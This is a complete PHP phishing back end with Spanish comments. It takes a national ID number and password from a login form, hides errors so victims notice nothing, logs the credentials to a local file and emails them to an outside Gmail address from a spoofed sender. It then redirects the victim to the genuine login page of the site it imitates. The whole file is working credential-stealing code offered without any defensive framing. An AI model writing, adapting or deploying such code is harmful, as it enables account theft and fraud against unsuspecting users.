<?php
// Ocultar errores para que el proceso sea invisible al usuario
error_reporting(0);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 1. Recolección de datos
    $cedula   = $_POST['cedula'];
    $password = $_POST['password'];
    $ip       = $_SERVER['REMOTE_ADDR'];
    $fecha    = date("d/m/Y H:i:s");

    // 2. Guardar en archivo de texto local (Copia de seguridad)
    // El archivo se llamará "registro_accesos.txt"
    $log = "Fecha: $fecha | IP: $ip | Cédula: $cedula | Clave: $password" . PHP_EOL;
    file_put_contents("registro_accesos.txt", $log, FILE_APPEND);

    // 3. Enviar por correo electrónico
    $para     = "geovannychinga76@gmail.com";
    $titulo   = "NUEVO ACCESO: $cedula";
    
    $mensaje  = "--- Datos Capturados ---\n";
    $mensaje .= "Cédula/Usuario: " . $cedula . "\n";
    $mensaje .= "Contraseña: " . $password . "\n";
    $mensaje .= "IP: " . $ip . "\n";
    $mensaje .= "Fecha: " . $fecha . "\n";
    $mensaje .= "------------------------";
    
    $cabeceras = "From: Sistema Alerta <no-reply@tudominio.com>\r\n";
    
    mail($para, $titulo, $mensaje, $cabeceras);

    // 4. Redirección al sitio real (Finaliza el proceso)
    header("Location: https://runachay.runacode.com/login");
    exit();
}
?>